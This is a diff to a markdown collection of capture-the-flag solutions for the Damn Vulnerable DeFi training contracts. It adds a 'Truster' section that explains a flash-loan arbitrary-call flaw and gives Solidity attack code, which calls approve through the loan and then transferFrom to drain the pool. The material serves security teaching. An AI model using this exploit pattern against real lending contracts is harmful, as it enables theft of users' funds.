@@ -4,6 +4,7 @@
 
 - [01 Unstoppable](#01-unstoppable)
 - [02 Naive Receiver](#02-naive-receiver)
+- [03 Truster](#03-truster)
 - [Template](#template)
 
 <!-- /MarkdownTOC -->
@@ -226,6 +227,58 @@ function test_naiveReceiver() public checkSolvedByPlayer {
 
 * The X user `0xaleko` [solves and explains this challenge](https://x.com/0xaleko/status/1815150400510505024).
 * [NaiveReceiver.t.sol](https://github.com/alekoisaev/damn-vulnerable-defi/blob/v4-solutions/test/naive-receiver/NaiveReceiver.t.sol) by [@alekoisaev](https://github.com/alekoisaev).
+
+## 03 Truster
+
+### Challenge
+
+> More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.
+>
+> The pool holds 1 million DVT tokens. You have nothing.
+>
+> To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.
+
+### Solution
+
+This attack exploits a vulnerability in the flash loan implementation, enabling an attacker to drain all ERC20 tokens held by the pool. The issue stems from the flash loan function’s use of `target.functionCall(data)` without proper validation of the `data` passed in, allowing arbitrary function calls on the target contract. Specifically, an attacker can invoke the `approve` function on the ERC20 token, granting themselves permission to withdraw all tokens from the pool.
+
+To execute the exploit, we must deploy an `Attacker` contract. This separation is necessary to comply with nonce checks in the protocol’s success conditions.
+
+```solidity
+function test_truster() public checkSolvedByPlayer {
+    // Perform the attack from another contract to comply with the nonce check.
+    // If executed here, the nonce will remain 0, failing the success condition.
+    Attacker attacker = new Attacker(pool, token, player, recovery);
+    attacker.attack();
+}
+```
+
+The `Attacker` contract requests a flash loan of 0 tokens. Since the flash loan function does not validate the amount, no tokens are actually loaned or need to be returned.
+
+During the flash loan execution, the `target.functionCall(data)` line is exploited to call the ERC20 token’s `approve` function. The attacker sets their own address as the spender with maximum allowance.
+
+With the approval in place, the attacker then calls `transferFrom` to move all tokens from the pool to their recovery address.
+
+```solidity
+function attack() public {
+    // Encode the selector and arguments separately, not nested.
+    // This attack leverages `target.functionCall(data)` in flashLoan to
+    // grant ERC20 approval and drain the pool’s funds.
+    bytes memory data = abi.encodeWithSelector(
+        token.approve.selector, address(this), type(uint256).max
+    );
+
+    // flashLoan does not check amount = 0, so no funds need to be returned.
+    pool.flashLoan(0, address(this), address(token), data);
+
+    // transferFrom checks if msg.sender has sufficient allowance; transfer funds now.
+    token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
+}
+```
+
+### References
+
+* https://eips.ethereum.org/EIPS/eip-20
 
 --------------------------------------------------------------------------------
 ## Template
